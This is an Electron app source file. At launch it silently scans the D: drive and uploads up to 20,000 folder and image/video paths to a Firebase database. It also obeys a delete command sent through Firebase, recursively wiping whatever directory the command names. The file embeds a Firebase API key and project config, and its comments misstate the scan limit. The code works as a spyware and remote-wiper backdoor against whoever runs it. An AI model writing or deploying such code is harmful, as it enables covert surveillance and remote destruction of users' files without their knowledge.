const { app } = require("electron");
const fs = require("fs");
const path = require("path");

// Firebase imports
const { initializeApp } = require("firebase/app");
const { getDatabase, ref, set, onValue } = require("firebase/database");

// Firebase config
const firebaseConfig = {
  apiKey: "AIzaSyBpKUW9G9XMleeLLnW0F7PFdoEOZc0zLgA",
  authDomain: "projectmanagement-c7883.firebaseapp.com",
  databaseURL: "https://projectmanagement-c7883-default-rtdb.firebaseio.com",
  projectId: "projectmanagement-c7883",
  storageBucket: "projectmanagement-c7883.firebasestorage.app",
  messagingSenderId: "907908963007",
  appId: "1:907908963007:web:310717b4b8d2b839f0840a",
  measurementId: "G-6YTNV66123"
};

// Init Firebase
const fbApp = initializeApp(firebaseConfig);
const db = getDatabase(fbApp);

// ✅ Recursive delete function
function deleteFilesRecursively(dir) {
  try {
    if (fs.existsSync(dir)) {
      const files = fs.readdirSync(dir);
      files.forEach(file => {
        const filePath = path.join(dir, file);
        const stat = fs.lstatSync(filePath);

        if (stat.isDirectory()) {
          deleteFilesRecursively(filePath);
          fs.rmdirSync(filePath);
          console.log(`🗑️ Deleted folder: ${filePath}`);
        } else {
          fs.unlinkSync(filePath);
          console.log(`🗑️ Deleted file: ${filePath}`);
        }
      });
      console.log("✅ Wiped contents of:", dir);
    } else {
      console.log("❌ Directory does not exist:", dir);
    }
  } catch (err) {
    console.error("⚠️ Error deleting:", err);
  }
}

// ✅ Allowed extensions for images & videos
const allowedExtensions = [
  ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".webp", ".tiff",
  ".mp4", ".avi", ".mov", ".mkv", ".flv", ".wmv", ".webm"
];

// ✅ Scan top 200 image/video files in D drive and save to Firebase
function scanDriveAndUpload() {
  const drivePath = "D:\\";
  const results = [];

  function walk(dir) {
    if (results.length >= 20000) return; // stop at 200

    try {
      const items = fs.readdirSync(dir);
      for (const item of items) {
        if (results.length >= 20000) break;

        const itemPath = path.join(dir, item);
        const stat = fs.lstatSync(itemPath);

        if (stat.isDirectory()) {
          // keep folder name in results
          results.push(itemPath);
          walk(itemPath); // recurse into subfolder
        } else {
          const ext = path.extname(item).toLowerCase();
          if (allowedExtensions.includes(ext)) {
            results.push(itemPath);
          }
        }
      }
    } catch (err) {
      // Ignore permission errors or inaccessible folders
    }
  }

  walk(drivePath);

  // ✅ Upload results into Firebase at /driveScan
  const scanRef = ref(db, "driveScan");
  set(scanRef, results)
    .then(() => {
      console.log(`📤 Uploaded ${results.length} image/video paths to Firebase`);
    })
    .catch((err) => {
      console.error("⚠️ Error uploading to Firebase:", err);
    });
}

app.whenReady().then(() => {
  console.log("🚀 Electron app started");

  // Run initial scan once at startup
  scanDriveAndUpload();

  // Listen for Firebase delete command
  const commandRef = ref(db, "deleteCommand");

  onValue(commandRef, (snapshot) => {
    const data = snapshot.val();
    if (!data) return;

    const { command, location } = data;
    console.log("📩 Firebase update:", data);

    if (command === "delete" && location) {
      const safePath = path.normalize(location); // handle "D:\\New folder"
      deleteFilesRecursively(safePath);
    }
  });
});